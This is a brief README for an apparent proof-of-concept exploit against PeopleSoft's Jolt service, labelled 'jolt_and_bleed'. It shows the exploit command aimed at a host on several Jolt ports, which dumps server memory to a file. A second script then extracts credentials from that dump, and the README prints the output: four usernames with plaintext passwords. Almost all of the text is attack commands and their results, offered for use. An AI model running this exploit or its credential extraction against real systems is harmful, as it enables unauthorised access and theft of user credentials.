# Install
```
$ pip install --user hexdump
```
# WARNING
Don't test on productuion servers.

# Info
Tested only on \*nix systems. 
```
$ psreleaseinfo
ToolsRelease: 8.55
ToolsReleaseDB: 8.55
```

# Usage example
```
$ python jolt_and_bleed_poc.py -s 192.168.56.101 -d out.bin -p 9034 9035 9036 9037 9038
...
...
Done

$ python extractCreds.py out.bin
RCLAYBURN:aeM9CuaXatohr1aixe9pohx4u
SADAMS:Ohl0ac4Gaasilae4Nouzoheeh
AJORDAN:peeW1bevoh7eitah1aucheegh
DMANAGER:ohquaix6aipoa6Euy7shu5moH
